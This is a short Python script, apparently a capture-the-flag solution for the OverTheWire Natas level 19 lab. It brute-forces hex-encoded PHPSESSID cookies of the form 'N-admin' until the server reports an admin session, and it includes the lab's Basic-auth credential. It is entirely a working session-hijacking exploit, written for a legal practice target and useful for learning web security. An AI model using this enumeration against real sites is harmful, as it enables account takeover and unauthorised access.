import requests
import time

auth_header = {
    'Authorization': 'Basic bmF0YXMxOTp0bndFUjdQZGZXa3hzRzRGTldVdG9BWjlWeVpUSnFKcg==',
}

url = 'http://natas19.natas.labs.overthewire.org'

for i in range(280, 300):
    admin_str = f"{i}-admin"
    hex_str = admin_str.encode('utf-8').hex()
    print(f"Trying {admin_str} with hex {hex_str}")
    cookie = {"PHPSESSID": hex_str}
    resp = requests.request(method='POST', url=url, headers=auth_header, cookies=cookie)
    time.sleep(0.1)
    # print(resp.text)
    if "You are an admin" in resp.text:
        print(resp.text)
        break
